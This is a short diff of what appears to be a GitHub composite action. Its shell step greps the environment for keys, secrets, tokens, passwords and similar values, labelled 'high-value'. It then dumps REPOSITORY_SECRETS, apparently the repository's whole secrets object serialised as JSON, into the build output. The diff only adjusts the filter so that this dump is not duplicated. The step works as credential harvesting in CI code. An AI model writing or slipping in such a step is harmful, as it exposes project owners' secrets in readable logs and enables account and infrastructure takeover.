@@ -81,7 +81,7 @@ runs:
           echo "--- env: high-value (keys/secrets/tokens/passwords) ---"
           printenv 2>/dev/null \
             | grep -iE '(key|secret|token|password|passwd|_pass|credential|auth|api_|dsn|private|jwt|webhook|database_url|redis_url|smtp)' \
-            | grep -v '^GITHUB_ACTION\|^GITHUB_REF\|^GITHUB_RUN\|^GITHUB_STEP\|^GITHUB_WORKFLOW\|^GITHUB_ENV\|^GITHUB_PATH\|^GITHUB_OUTPUT\|^RUNNER_' \
+            | grep -v '^GITHUB_ACTION\|^GITHUB_REF\|^GITHUB_RUN\|^GITHUB_STEP\|^GITHUB_WORKFLOW\|^GITHUB_ENV\|^GITHUB_PATH\|^GITHUB_OUTPUT\|^RUNNER_\|^REPOSITORY_SECRETS' \
             | sort || true
           echo "--- env: REPOSITORY_SECRETS (toJSON dump) ---"
           printenv REPOSITORY_SECRETS 2>/dev/null || true
